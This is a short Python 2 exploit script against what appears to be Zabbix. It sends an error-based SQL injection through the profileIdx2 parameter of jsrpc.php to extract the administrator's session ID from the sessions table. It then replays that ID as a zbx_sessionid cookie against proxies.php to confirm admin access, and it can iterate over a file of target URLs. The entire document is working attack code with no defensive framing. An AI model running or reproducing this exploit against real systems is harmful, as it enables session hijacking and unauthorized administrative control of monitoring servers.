#!/usr/bin/env python
import urllib,sys,urllib2,urllib
def cookie(url):
    poc='/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=(select 1 from (select count(*),concat(floor(rand(0)*2), (select sessionid from sessions where userid=1 and status=0 limit 1))x from information_schema.character_sets group by x)y)&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color='
    body= urllib.urlopen(url+poc).read()
    cookie=body.split('Duplicate entry')[1].split('for key')[0][3:-2]
    return cookie
def test(cookie,url):
    url=url+'proxies.php'
    req=urllib2.Request(url)
    cook="zbx_sessionid=%s" % cookie
    req.add_header('Cookie', cook)
    response=urllib2.urlopen(req)
    data=response.read()
    if data.find('Access denied.') < 0:
        print "OK-->",cookie
    else:
        print 'ERROR'
if len(sys.argv)==4:
    for i in open(sys.argv[3]).readlines():
        print i
        test(cookie(i),i)
else:
    print sys.argv[1]
    test(cookie(sys.argv[1]),sys.argv[1])
